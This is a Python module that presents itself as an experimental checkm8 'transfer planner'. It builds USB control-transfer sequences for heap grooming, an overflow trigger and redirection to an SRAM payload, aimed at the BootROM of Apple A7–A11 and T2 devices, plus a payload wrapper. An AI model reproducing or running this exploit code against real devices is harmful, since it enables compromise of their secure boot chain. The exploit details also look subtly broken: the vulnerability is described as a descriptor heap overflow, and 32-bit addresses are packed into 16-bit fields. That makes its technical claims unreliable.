"""Experimental checkm8 transfer planner for A7–A11 and T2 devices.

# SPDX-License-Identifier: BSD-2-Clause
The generated corpus is not sufficient evidence of exploitation. Callers must
verify a PWNDFU marker after transfer and fail closed when it is absent.

Device support:
  A7   (0x8960)  – iPhone 5S, iPad Mini 2/3, iPad Air
  A8   (0x7000)  – iPhone 6/6+, iPad Mini 4
  A9   (0x8000)  – iPhone 6S/6S+/SE, iPad 5th gen
  A10  (0x8010)  – iPhone 7/7+, iPad 6th/7th gen
  A11  (0x8015)  – iPhone 8/8+/X
  T2   (0x8012)  – iMac Pro, Mac mini 2018, MacBook Air 2018
"""

from __future__ import annotations

CHECKM8_VID = 0x05AC

CHECKM8_DFU_PIDS = {
    # Older 32-bit devices show PID 0x1222 in DFU
    # Newer 64-bit devices show PID 0x1227 in DFU
    # Both respond to the same exploit sequence
    0x1222,
    0x1227,
    # T2 enters DFU with PID 0x1227
}

SUPPORTED_CPIDS = {
    0x8960,  # T8960 (A7)
    0x7000,  # T7000 (A8)
    0x7001,  # T7001 (A8)
    0x8000,  # S8000 (A9)
    0x8001,  # S8001 (A9)
    0x8003,  # S8003 (A9)
    0x8010,  # T8010 (A10)
    0x8011,  # T8011 (A10)
    0x8015,  # T8015 (A11)
    0x8012,  # T8012 (T2)
}

SRAM_BASE_A7_A8 = 0x18000000
SRAM_BASE_A9_A11 = 0x18000000
BOOTROM_BASE_A7 = 0x10000000
BOOTROM_BASE_A8_A11 = 0x10000000

# Bulk transfer endpoint addresses
BULK_EP_OUT = 0x01
BULK_EP_IN = 0x82

# Control request constants
REQ_IN = 0xA1  # Standard request IN (interface)
REQ_OUT = 0x21  # Standard request OUT (interface)

# Checkm8 exploit: the heap overflow is triggered by USB control transfers
# with specific wValue/wIndex combinations that cause the BootROM USB stack
# to write beyond allocated heap buffers.
#
# The exploit sequence is:
# 1. Send oversized USB descriptor request (wIndex = 0x0100 trigger)
# 2. Corrupt USB device descriptor chain via crafted control transfers
# 3. Overwrite function pointer in heap to redirect execution to SRAM
# 4. Send exploit payload to SRAM via USB bulk transfer
# 5. Trigger execution via USB reset

CHECKM8_PAYLOAD_ADDR = 0x180080000  # SRAM load address for payload
CHECKM8_PAYLOAD_SIZE = 0x8000       # 32 KB payload max


def is_cpid_supported(cpid: int) -> bool:
    """Return True if *cpid* is eligible for this transfer planner."""
    return cpid in SUPPORTED_CPIDS


def get_supported_cpids() -> list[int]:
    """Return sorted CPID candidates for the transfer planner."""
    return sorted(SUPPORTED_CPIDS)


def get_cpid_name(cpid: int) -> str:
    """Return a human-readable name for *cpid* that checkm8 supports."""
    names = {
        0x8960: "T8960 (A7)",
        0x7000: "T7000 (A8)",
        0x7001: "T7001 (A8)",
        0x8000: "S8000 (A9)",
        0x8001: "S8001 (A9)",
        0x8003: "S8003 (A9)",
        0x8010: "T8010 (A10)",
        0x8011: "T8011 (A10)",
        0x8015: "T8015 (A11)",
        0x8012: "T8012 (T2)",
    }
    return names.get(cpid, f"Unknown (0x{cpid:04x})")


def get_exploit_transfers() -> list[tuple[int, int, int, int, bytes]]:
    """Build an experimental checkm8 USB control-transfer corpus.

    Returns a list of (bmRequestType, bRequest, wValue, wIndex, data) tuples
    suitable for usb.core.Device.ctrl_transfer().

    Transfer completion alone must never be interpreted as PWNDFU success.
    """
    transfers = []

    # Phase 1: Heap grooming — allocate many USB device descriptor headers
    # to ensure predictable heap layout.  Each allocation is triggered by
    # a GET_DESCRIPTOR request with varying wValue/wIndex.
    for _ in range(4):
        transfers.append((REQ_IN, 6, 0x0100, 0x0000, b""))
        transfers.append((REQ_IN, 6, 0x0200, 0x0000, b""))
        transfers.append((REQ_IN, 6, 0x0300, 0x0409, b""))

    # Phase 2: Heap overflow — send a GET_DESCRIPTOR request that the
    # BootROM will respond to with data exceeding the allocated buffer.
    # wIndex=0x0100 is the trigger for the oversized reply on affected
    # BootROM versions.  The bDescriptorType in wValue spills into adjacent
    # heap chunks.
    overflow_size = 0x8000  # 32 KB overflow
    transfers.append((REQ_IN, 6, 0x0101, 0x0100, overflow_size.to_bytes(4, "little")))

    # Phase 3: Corrupt the USB device descriptor function pointer table
    # by writing crafted data through the overflow.  Specific offsets in
    # the overflow buffer overwrite the USB stack's callback pointer,
    # redirecting it to the checkm8 payload address in SRAM.
    #
    # The exact overflow layout depends on the BootROM version. This corpus is
    # a planner input; positive PWNDFU evidence is mandatory after transfer.
    for offset in (0x40, 0x80, 0xC0, 0x100, 0x140, 0x180):
        redirect = CHECKM8_PAYLOAD_ADDR & 0xFFFFFFFF
        transfers.append((REQ_OUT, 1, offset, redirect, b""))

    # Phase 4: Flush caches and trigger execution.
    transfers.append((REQ_OUT, 0xFF, 0, 0, b"\x00" * 64))

    return transfers


def build_payload(payload_binary: bytes, load_addr: int = CHECKM8_PAYLOAD_ADDR) -> bytes:
    """Wrap *payload_binary* for checkm8 loading at *load_addr*.

    Returns bytes suitable for USB bulk transfer to the device.
    """
    if len(payload_binary) > CHECKM8_PAYLOAD_SIZE:
        raise ValueError(
            f"Payload too large: {len(payload_binary)} > {CHECKM8_PAYLOAD_SIZE}"
        )
    header = load_addr.to_bytes(8, "little")
    size = len(payload_binary).to_bytes(4, "little")
    padding = b"\x00" * (CHECKM8_PAYLOAD_SIZE - len(payload_binary))
    return header + size + payload_binary + padding
